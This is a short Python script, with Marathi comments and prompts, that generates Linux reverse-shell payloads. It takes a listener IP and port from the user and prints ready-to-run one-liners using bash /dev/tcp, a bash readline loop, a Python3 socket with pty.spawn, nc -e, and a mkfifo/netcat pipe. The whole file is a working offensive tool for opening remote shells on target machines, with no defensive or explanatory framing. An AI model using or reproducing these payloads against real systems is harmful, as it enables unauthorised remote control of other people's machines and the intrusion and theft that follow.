#!/usr/bin/env python3
import os

def generate_reverse_shells():
    print("==================================================")
    print("        REVERSE SHELL PAYLOAD GENERATOR           ")
    print("==================================================")
    
    # युझरकडून IP आणि Port इनपुट घेणे
    ip = input("[+] तुमचा Listener IP टाका (उदा. 10.10.10.14): ")
    port = input("[+] तुमचा Listener Port टाका (उदा. 4444): ")
    
    if not ip or not port:
        print("[-] कृपया IP आणि Port दोन्ही अचूक टाका!")
        return

    # वेगवेगळ्या प्रकारचे लिनक्स रिव्हर्स शेल पेलोड्स
    payloads = {
        "Bash (Standard)": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        
        "Bash (Readline)": f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
        
        "Python3": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
        
        "Netcat (nc -e)": f"nc {ip} {port} -e /bin/bash",
        
        "Netcat (OpenBSD target - No -e)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    }
    
    print("\n" + "="*20 + " GENERATED PAYLOADS " + "="*20)
    
    # सर्व पेलोड्स स्क्रीनवर प्रिंट करणे (हिरव्या रंगात)
    for name, payload in payloads.items():
        print(f"\n[*] {name} :")
        print(f"\033[92m{payload}\033[0m")
        
    print("\n" + "="*60)

if __name__ == "__main__":
    generate_reverse_shells()
